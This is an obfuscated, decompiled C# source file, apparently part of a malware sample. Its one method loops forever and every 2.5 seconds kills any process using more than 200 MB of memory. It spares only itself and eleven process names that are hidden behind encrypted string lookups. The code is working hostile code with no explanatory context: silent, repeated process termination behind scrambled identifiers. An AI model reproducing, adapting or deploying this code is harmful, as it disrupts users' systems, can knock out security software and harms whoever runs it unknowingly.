using System;
using System.Diagnostics;
using System.Threading;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace HSFBHZCtMXjPES;

public static class mIyPClLKYPq
{
	[NonSerialized]
	internal static GetString getString_0;

	public static void MbeaFiDLkvqqWDS()
	{
		while (true)
		{
			Process[] processes = Process.GetProcesses();
			foreach (Process process in processes)
			{
				try
				{
					if (process.PrivateMemorySize64 > 209715200L && process.ProcessName != Process.GetCurrentProcess().ProcessName && !process.ProcessName.Contains(getString_0(107363069)) && !process.ProcessName.Contains(getString_0(107363540)) && !process.ProcessName.Contains(getString_0(107363531)) && !process.ProcessName.Contains(getString_0(107363554)) && !process.ProcessName.Contains(getString_0(107363509)) && !process.ProcessName.Contains(getString_0(107363528)) && !process.ProcessName.Contains(getString_0(107363515)) && !process.ProcessName.Contains(getString_0(107363470)) && !process.ProcessName.Contains(getString_0(107363489)) && !process.ProcessName.Contains(getString_0(107363444)) && !process.ProcessName.Contains(getString_0(107363455)))
					{
						process.Kill();
					}
				}
				catch
				{
				}
			}
			try
			{
				Thread.Sleep(2500);
			}
			catch
			{
			}
		}
	}

	static mIyPClLKYPq()
	{
		Strings.CreateGetStringDelegate(typeof(mIyPClLKYPq));
	}
}
